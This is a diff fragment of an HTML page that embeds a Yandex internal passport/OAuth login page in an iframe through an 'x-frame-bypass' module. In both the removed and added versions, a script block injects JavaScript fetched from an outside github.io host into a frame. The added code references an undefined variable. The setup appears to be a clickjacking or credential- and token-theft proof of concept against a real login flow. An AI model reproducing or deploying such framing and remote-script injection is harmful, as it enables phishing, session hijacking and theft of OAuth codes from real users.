@@ -28,15 +28,17 @@
 	<script src="x-frame-bypass.js" type="module"></script>
 </head>
 <body>
-		<script>
-	frame=document.createElement("iframe");
-	frame.src="/css/bootstrap.min.css";
-
-	document.body.appendChild(frame);
-	script=document.createElement('script');
-	script.src='//vasilevigor3.github.io/myjs.js';
-	window.frames[0].document.head.appendChild(script);
-</script>
+	<script>
+		var doc = document.querySelector('.asd')
+		var iframeDocument = iframe.contentWindow.document;
+		
+		var frame=iframeDocument.createElement("iframe");
+		frame.src="/css/bootstrap.min.css";
+		document.body.appendChild(frame);
+		var script=document.createElement('script');
+		script.src='//vasilevigor3.github.io/myjs.js';
+		window.frames[0].document.head.appendChild(script);
+	</script>
 	<iframe is="x-frame-bypass" src="https://passport.yandex-team.ru/auth?retpath=https%3A%2F%2Foauth.yandex-team.ru%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D50136e798c0f440b864d606fcdb8d7b4%26state%3Dhttps%25253A%2F%2Fpass-test.yandex.ru%2F%253AW0oewGIkIpJiRjlO%2F0fMtxaaKnvts5wa6N9Fp1ilvdk%25253D&noreturn=1&origin=oauth" class="asd"></iframe>
 
 	<script>
